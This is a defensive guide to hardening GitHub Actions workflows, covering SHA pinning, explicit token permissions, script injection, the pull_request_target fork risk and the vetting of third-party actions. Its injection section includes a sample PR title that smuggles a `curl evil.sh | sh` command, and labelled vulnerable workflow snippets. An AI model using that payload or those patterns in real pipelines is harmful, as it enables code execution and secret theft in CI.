# Actions Security

A CI job is a machine with credentials that executes code from your repository, your dependencies, and whatever third-party actions you referenced. Treating a workflow file as configuration rather than as **privileged code** is the root of most CI compromises.

| Control | Cost | Worth it |
| ------- | ---- | -------- |
| **Pin third-party actions to a commit SHA** | One-off, then automated | **Always.** Cheapest real control available |
| **Set `permissions` explicitly** | One block per workflow | **Always.** The default is broader than any job needs |
| **Never interpolate untrusted input into `run`** | Attention | **Always.** This is remote code execution |
| **Avoid `pull_request_target`** | Design effort | **Almost always.** It hands secrets to fork code |
| **Review third-party actions before use** | Real time | For anything touching secrets or publishing |

---

## Pin to a SHA, not a tag

`uses: actions/checkout@v7` executes whatever `v7` points at when the job runs. Tags are mutable references: the owner, or anyone who compromises the owner's account, can move them. A SHA cannot be moved.

```yaml
# mutable - executes today's v7
- uses: actions/checkout@v7

# immutable - executes exactly this tree
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
```

**Always leave the version in a trailing comment.** Without it the workflow is unreadable and nobody will ever update it. Renovate and Dependabot both understand this convention and will bump the SHA and the comment together, which is what makes pinning sustainable rather than a one-off act of diligence. See [dependency-updates.md](dependency-updates.md).

Resolving a tag to its SHA, which is scriptable and needs no authentication for public repositories:

```bash
gh api repos/actions/checkout/git/ref/tags/v7.0.1 --jq .object.sha
# or without gh:
curl -sSL https://api.github.com/repos/actions/checkout/git/ref/tags/v7.0.1 \
  | python -c "import sys,json;print(json.load(sys.stdin)['object']['sha'])"
```

**Verified by resolving these on this machine** - see [platform-versions.md](platform-versions.md) for the table, and note that a first-party action being at v7 while tutorials still show v3 is normal and is why pinning must be paired with automated updates.

### Does first-party need pinning?

`actions/*` is maintained by GitHub, so the threat model is narrower, and many teams reasonably pin only third-party actions. Be deliberate about the choice rather than inheriting it by accident. For anything outside `actions/` and `github/`, pin.

## Set `permissions` explicitly

The `GITHUB_TOKEN` is minted per job. Its default scope depends on organisation and repository settings, which means **a workflow with no `permissions` block has whatever the org default happens to be**, and that can change without the workflow changing.

```yaml
# at workflow level: the floor for every job
permissions:
  contents: read

jobs:
  build:
    # raise only where needed, only for the job that needs it
    permissions:
      contents: read
      id-token: write        # OIDC federation
      packages: write        # pushing to GHCR
```

Declare the minimum at workflow level and raise per job. A release job needing `contents: write` is not a reason for the test job to have it.

**`permissions: {}` grants nothing**, which is the right setting for a job that only reads public data.

## Script injection

This is the highest-severity workflow defect and it looks harmless:

```yaml
# VULNERABLE - the title is attacker-controlled
- run: echo "Reviewing ${{ github.event.pull_request.title }}"
```

`${{ }}` interpolation happens **before** the shell sees the script. GitHub substitutes the raw text into the script body. A pull request titled `"; curl evil.sh | sh; #` becomes part of the command. The attacker needs no write access - opening a pull request is enough.

Untrusted fields include, and are not limited to: PR and issue titles and bodies, comment bodies, branch and tag names, author names and emails, and review bodies.

**The fix is to pass through the environment**, where the value is data rather than script:

```yaml
# SAFE - the shell receives a variable, never code
- run: echo "Reviewing $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

The same rule applies in `azure-devops` and `gitlab-ci`: template expansion precedes execution on all three platforms, so the class of bug is identical and only the syntax differs. See [platform-matrix.md](platform-matrix.md).

## `pull_request_target` and the fork problem

`pull_request` runs fork code **without** secrets and with a read-only token. That is the safe default, and it is why fork builds cannot publish.

`pull_request_target` runs in the context of the *base* repository, **with** secrets available, while the pull request contains arbitrary attacker code. Checking out the PR head under `pull_request_target` and then running anything from it - a build, a test, a lint, an `npm install` that executes a lifecycle script - executes attacker code with your secrets in scope.

```yaml
# DANGEROUS
on: pull_request_target
jobs:
  x:
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
      - run: npm ci && npm test                            # with secrets present
```

If you need a privileged action on a fork PR, split it: an unprivileged `pull_request` workflow produces an artifact, and a separate `workflow_run` workflow consumes that artifact with privileges and **never executes the fork's code**. Treat the artifact as untrusted data.

## Assessing a third-party action

Before `uses:` on anything outside `actions/`:

1. **Read what it does.** A JavaScript action is a bundled `dist/index.js`; a composite action is shell. Either way you are executing it with your token.
2. **Check it is not a redirect.** Some actions are thin wrappers that `curl | sh` at runtime, which defeats pinning entirely because the pinned SHA fetches unpinned code.
3. **Look at maintenance and ownership.** A single-maintainer action with a year of no commits, used in a release job, is a supply-chain risk with a name.
4. **Prefer a `run:` step.** Most trivial actions wrap two lines of shell. Writing the shell removes a dependency and is usually clearer.
5. **Consider vendoring** anything critical, so an upstream deletion or account compromise cannot affect you.

## Other hardening worth doing

- **`persist-credentials: false`** on `actions/checkout` where later steps do not need to push. Otherwise the token stays in `.git/config` for the whole job, readable by anything running afterwards.
- **Restrict which actions can run at all**, at organisation level: allow `actions/*` plus an explicit list. This is the only control that scales across many repositories.
- **`concurrency`** with cancellation to stop a superseded run continuing to hold credentials.
- **Never `echo` a secret**, and remember that masking is best-effort: a secret transformed (base64, JSON-encoded, split) is no longer masked.
- **Self-hosted runners must not serve public repositories.** A fork PR would execute on your infrastructure, and the default runner is not ephemeral. See [runners.md](runners.md).

## Version notes

| | Status |
| --- | ------ |
| `actions/checkout` | **v7.0.1** - `3d3c42e5aac5ba805825da76410c181273ba90b1` |
| `actions/setup-java` | **v6.0.0** - `dd06d9cba3e5552c54d9f8ea23572deb30010f7c` |
| `actions/cache` | **v6.1.0** - `55cc8345863c7cc4c66a329aec7e433d2d1c52a9` |
| `actions/upload-artifact` | **v7.0.1** - `043fb46d1a93c77aae656e7c1c64a875d1fc6a0a` |

Resolved through the GitHub API on this machine. **These move; re-resolve rather than copying.** Any tutorial showing `actions/checkout@v3` is several majors stale, which is itself the argument for automated bumping.

- **The `GITHUB_TOKEN` default scope is an org and repo setting**, so it is not knowable from the workflow file. Always declare `permissions`.
- **Immutable action releases** are being rolled out by GitHub, which makes tags harder to move. It does not remove the reason to pin.
- **Not verified here:** token scoping behaviour, `pull_request_target` mechanics and org-level action allowlists all need a hosted runner and an organisation. Sourced to GitHub's security hardening documentation.

## Gotchas

- Agent references a third-party action by tag - tags move, SHAs do not; pin and add a version comment
- Agent pins a SHA with no comment - unreadable and never updated; Renovate and Dependabot both maintain the comment
- Agent omits `permissions` - the job inherits an org default that can change without the workflow changing
- Agent grants `contents: write` at workflow level for one release job - raise per job, not globally
- Agent interpolates `${{ github.event.* }}` into a `run:` block - **remote code execution**; pass it through `env:` instead
- Agent assumes only repository writers can trigger a workflow - opening a pull request is enough, and PR titles are attacker-controlled
- Agent uses `pull_request_target` to get secrets on a fork PR - hands secrets to attacker code; split into `pull_request` plus `workflow_run`
- Agent trusts an artifact from an unprivileged workflow - it is untrusted data; never execute it in the privileged consumer
- Agent leaves `persist-credentials` at default when no push is needed - the token remains in `.git/config` for the rest of the job
- Agent relies on log masking to protect a secret - masking is best-effort and any transformation defeats it
- Agent attaches a self-hosted runner to a public repository - fork pull requests then execute on your infrastructure
- Agent pins an action that fetches a script at runtime - the pin is meaningless if the pinned code downloads unpinned code

## Related

- [oidc-and-secrets.md](oidc-and-secrets.md) · [github-actions.md](github-actions.md) · [runners.md](runners.md) · [dependency-updates.md](dependency-updates.md) · [provenance-and-signing.md](provenance-and-signing.md) · [platform-matrix.md](platform-matrix.md) · [platform-versions.md](platform-versions.md) · [checklist.md](checklist.md)
